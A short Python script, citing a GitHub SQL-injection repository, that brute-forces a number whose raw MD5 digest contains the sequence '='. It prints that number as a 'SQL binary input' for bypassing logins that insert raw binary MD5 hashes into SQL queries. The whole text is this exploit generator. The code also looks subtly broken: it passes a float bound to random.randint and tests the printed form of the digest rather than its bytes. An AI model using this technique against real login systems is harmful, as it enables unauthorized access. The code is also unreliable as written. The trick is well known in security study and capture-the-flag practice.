###################################################
#                                                 #
# Reference:                                      #
# https://github.com/seunghunoh57/SQL-Injection   #
#                                                 #
###################################################

import random
import re
import hashlib

while (True):
    teststr = str(random.randint(0, (2**32)/2 - 1))
    has_equal = re.search(r"'='", str(hashlib.md5(teststr.encode()).digest()))
    end_with_equal = str(hashlib.md5(teststr.encode()).digest()).endswith(r"'='")
    start_with_equal = str(hashlib.md5(teststr.encode()).digest()).startswith(r"'='")
    
    if has_equal and (not end_with_equal) and (not start_with_equal):
        print ("SQL binary input:\t", teststr.encode())
        print ("SQL hashed input:\t", str(hashlib.md5(teststr.encode()).digest()))
        break
